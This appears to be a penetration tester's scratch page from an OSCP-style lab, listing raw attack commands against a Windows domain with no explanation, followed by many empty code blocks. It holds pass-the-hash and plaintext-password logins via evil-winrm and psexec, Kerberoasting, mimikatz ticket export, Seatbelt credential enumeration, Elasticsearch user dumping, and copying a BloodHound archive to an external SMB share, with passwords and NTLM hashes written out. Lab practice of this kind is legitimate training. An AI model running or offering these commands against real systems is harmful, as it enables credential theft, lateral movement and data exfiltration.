[[Editing Copy Page]]

```
evil-winrm -i 192.168.123.206 -u 'r.andrews' -p 'BusyOfficeWorker890'
```

MS01 administrator evilwinrm login
```
evil-winrm -i 192.168.123.206 -u 'Administrator' -H '2a00a0a55d5a916e79c91ad30e770715'
```

MS01 nt authority psexec login
```
impacket-psexec SRV22.oscp.exam/Administrator@192.168.123.206 -hashes aad3b435b51404eeaad3b435b51404ee:2a00a0a55d5a916e79c91ad30e770715
```

```
aad3b435b51404eeaad3b435b51404ee:2a00a0a55d5a916e79c91ad30e770715
```

```
curl -skD- -o /dev/null https://192.168.123.110:9200/
```

#List all roles on the system:
curl -X GET "ELASTICSEARCH-SERVER:9200/_security/role"

#List all users on the system:
curl -X GET "ELASTICSEARCH-SERVER:9200/_security/user"

#Get more information about the rights of an user:
curl -X GET "ELASTICSEARCH-SERVER:9200/_security/user/USERNAME"

```
curl -X GET "192.168.123.110:9200/_security/user"
```


```
http://192.168.123.110:5601/status
```

```
impacket-mssqlclient SRV22.OSCP.EXAM\svc_mssql:qazwsx@172.16.123.202 -windows-auth
```

.\seatbelt.exe CredEnum DpapiMasterKeys RDCManFiles RDPSavedConnections WindowsCredentialFiles WindowsVault TokenGroups LogonSessions AutoRuns ScheduledTasks Services LocalGroups TokenPrivileges InterestingFiles -outputfile=seatbelt.txt

```
impacket-GetUserSPNs -request -dc-ip 172.16.123.200 SRV22.OSCP.EXAM/svc_mssql
```

```
impacket-getTGT 'DC20.oscp.exam/svc_mssql:qazwsx' -dc-ip 172.16.123.200
```

```
nxc smb 172.16.123.202 -u svc_mssql -p 'qazwsx' --sessions
```

```
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
```

```
copy 20261126073219_BloodHound.zip \\192.168.49.123\share\
```

```
impacket-mssqlclient oscp.exam/svc_mssql@172.16.123.202 -windows-auth
```

```
netexec smb DC20.oscp.exam -u 'svc_mssql' -p 'qazwsx' -k --generate-krb5-file krb5.conf
```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```